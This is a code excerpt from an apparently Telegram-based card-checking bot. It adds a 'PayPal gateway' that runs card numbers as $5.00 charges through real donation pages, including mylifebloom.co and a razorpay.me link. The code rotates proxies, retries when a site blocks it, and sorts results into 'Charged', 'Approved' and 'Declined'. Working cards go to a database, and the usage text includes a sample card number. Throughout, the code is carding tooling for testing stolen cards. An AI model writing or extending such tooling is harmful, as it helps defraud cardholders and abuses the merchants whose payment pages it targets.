...
# Added PayPal Gateway Support - FULLY FIXED
...
def format_pp_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0, price="5.00"):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
...
def classify_pp_response(response_text):
    ...
    # Charged keywords
    charged_keywords = [
        'charged', 'payment successful', 'transaction successful', 
        'order paid', 'payment completed', 'success', 'approved',
        'captured', 'authorized', 'payment captured', 'paid', 'live'
    ]
    
    # Approved keywords (OTP, 3DS, etc)
    approved_keywords = [
        'otp required', 'otp_required', '3d authentication', '3ds required',
        'authentication required', 'additional authentication', 'bank auth',
        'cvc required', 'verify your card', '3d_secure', '3d redirect',
        'insufficient funds', 'insufficient_funds', 'cvv', 'ccn'
    ]
    
    # Declined keywords
    declined_keywords = [
        'declined', 'card declined', 'payment declined', 'transaction declined',
        'insufficient funds', 'card error', 'invalid card', 'expired card',
        'do not honor', 'stolen card', 'lost card', 'restricted card',
        'fraud', 'not authorized', 'payment failed', 'failed', 'cancelled',
        'generic decline', 'do_not_honor', 'card_not_supported', 'dead'
    ]
    
    # Error keywords (retryable)
    error_keywords = [
        'timeout', 'connection error', 'server error', 'internal error',
        'bad gateway', 'service unavailable', 'rate limit', 'too many requests',
        'invalid proxy', 'proxy error', 'http_500', 'http_502', 'http_503', 'http_504',
        '403', 'forbidden', 'blocked'
    ]
    
    for kw in charged_keywords:
        if kw in lower_resp:
            return {"Response": response_text[:200], "Gateway": gate, "Status": "Charged"}
    
    for kw in approved_keywords:
        if kw in lower_resp:
            return {"Response": response_text[:200], "Gateway": gate, "Status": "Approved"}
    
    for kw in error_keywords:
        if kw in lower_resp:
            return {"Response": response_text[:200], "Gateway": gate, "Status": "Error"}
    
    for kw in declined_keywords:
        if kw in lower_resp:
            return {"Response": response_text[:200], "Gateway": gate, "Status": "Declined"}
    
    # Check for HTTP status codes in response
    if any(x in response_text for x in ['HTTP_400', 'HTTP_401', 'HTTP_403', 'HTTP_404', 'HTTP_429', 'HTTP_500', 'HTTP_502', 'HTTP_503', 'HTTP_504']):
        if '400' in response_text or '401' in response_text or '403' in response_text:
            return {"Response": response_text[:200], "Gateway": gate, "Status": "Declined"}
        else:
            return {"Response": response_text[:200], "Gateway": gate, "Status": "Error"}
    
    # If response contains success indicators but not in keywords
    if 'success' in lower_resp or 'complete' in lower_resp:
        return {"Response": response_text[:200], "Gateway": gate, "Status": "Charged"}
...
async def check_pp_api(card, site_url, amount="5.00", proxy_data=None, user_id=None, http_session=None):
    ...
    try:
        ...
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT)) as r:
            ...
            try:
                rj = await r.json(content_type=None)
                response_text = str(rj.get('response', rj.get('message', rj.get('status', str(rj)))))
            except:
                response_text = await r.text()
            
            if r.status == 403:
                return {"Response": f"HTTP_403: Site may be blocked or invalid. Try a different site URL", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
            elif r.status != 200:
                return {"Response": f"HTTP_{r.status}: {response_text[:100]}", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
        
        result = classify_pp_response(response_text)
        result["card"] = card
        result["site"] = site_url
        result["amount"] = amount
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout - API took too long to respond", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": f"Connection Error: {str(e)[:80]}", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
...
async def check_pp_with_retry(card, site_url, proxies_data=None, user_id=None, max_retries=3, amount="5.00", cancel_check=None, http_session=None):
    ...
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Gateway": "PayPal", "Status": "Error", "card": card}
    ...
    if last:
        if is_pp_retry_error(last.get("Response", "")):
            last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Gateway": "PayPal", "Status": "Error", "card": card}
...
async def pp_single_check(event):
    ...
    # If still no site URL, show usage
    if not site_url:
        return await styled_reply(event, f"""{PE} <b>{bs('Usage')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <code>/pp site.com card|mm|yy|cvv</code>

{PE} <b>{bs('Example')}:</b>
{PE} <code>/pp mylifebloom.co 4414511463173656|05|2030|687</code>

{PE} <i>{bs('Or reply to a card with /pp after providing site')}</i>""", emoji_ids=[CE["info"], CE["info"], CE["link"]])
    
    # If no card, check for card in command or reply
    if not card:
        card = _get_card_from_event(event, None)
        if not card and len(parts) >= 3:
            cards = extract_cc(' '.join(parts[2:]))
            if cards:
                card = cards[0]
    ...
    try:
        ...
        async with get_user_sem(uid, "pp"):
            result = await check_pp_with_retry(card, site_url, proxies, uid, max_retries=3, amount="5.00", http_session=http_session)
        ...
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'PayPal', "5.00"))
        
        msg, eid = format_pp_single_result(status, card, 'PayPal', result.get('Response', '')[:150], bi, elapsed, price="5.00")
        ...
        if status == "Charged":
            ...
            result_with_amount["amount"] = "5.00"
    ...
    async def worker(card):
        ...
        async with user_sem:
            ...
            try:
                ...
                price = result.get("Price", "-") if not is_pp else "5.00"
                checked += 1
                lcd = card
                lrd = resp[:30]
...
{PE} <i>{bs('Supported sites for PayPal')}:</i>
{PE} • <code>mylifebloom.co</code>
{PE} • <code>razorpay.me/@tpstech</code>
{PE} • <i>{bs('Use any valid donation/payment page')}</i>""", emoji_ids=[CE["info"], CE["info"], CE["link"], CE["globe"]])
    
    if not site_url:
        return await styled_reply(event, f"{PE} <b>{bs('Site URL Required')}</b>\n{PE} {bs('Please provide a valid site URL')}\n{PE} <code>/mpp your-site.com</code>", emoji_ids=[CE["warn"]])
    ...
    if not content and event.reply_to_msg_id:
        ...
        # If content already set from parts[1:], keep it
        if not content and len(parts) > 1:
            content = ' '.join(parts[1:]) if site_url else cmd_text
...
async def pp_pref_cb(event):
    ...
    await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    site_url = data.get("site_url", "https://mylifebloom.co/donations/support-the-lifebloom-cause/")
